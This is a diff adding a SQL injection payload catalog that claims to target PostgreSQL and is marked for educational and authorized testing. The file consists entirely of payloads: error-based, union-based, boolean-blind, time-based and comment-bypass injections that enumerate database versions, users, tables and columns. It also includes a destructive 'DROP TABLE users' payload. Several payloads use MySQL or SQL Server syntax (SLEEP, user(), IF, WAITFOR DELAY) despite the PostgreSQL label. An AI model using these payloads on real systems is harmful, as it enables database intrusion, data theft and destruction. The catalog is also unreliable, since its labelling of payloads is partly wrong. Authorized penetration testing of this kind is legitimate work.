@@ -1,0 +1,36 @@
+# SQL Injection Payload Catalog — POSTGRESQL
+# Generated : 2026-02-20 18:30:04
+# Purpose   : Educational & authorized testing only
+
+
+## ERROR BASED
+1' AND CAST((SELECT version()) AS int)--
+1' AND (SELECT ((SELECT version())::int))--
+1' AND CAST(CONCAT((SELECT current_user), (SELECT version())) AS int)--
+1' AND (SELECT (SELECT array_agg(tablename) FROM pg_tables WHERE schemaname='public')::int)--
+
+## UNION BASED
+1' UNION SELECT version(), current_user, current_database(), NULL--
+1' UNION SELECT tablename, NULL, NULL, NULL FROM pg_tables WHERE schemaname='public'--
+1' UNION SELECT column_name, data_type, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
+1' UNION SELECT string_agg(tablename, ', '), string_agg(schemaname, ', '), NULL, NULL FROM pg_tables--
+
+## BOOLEAN BLIND
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+1' AND (SELECT LENGTH(user())) > 5--
+1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--
+1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN 1 ELSE 0 END) = 1--
+
+## TIME BASED
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--
+1' OR 1=1; WAITFOR DELAY '00:00:05'--
+1' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+## COMMENT BYPASS
+1' OR '1'='1
+1' UNION SELECT NULL#
+1' UNION SELECT NULL,NULL/*
+1'; DROP TABLE users; --
+1' AND '1'='1' --
+1' OR '1'='1' /*
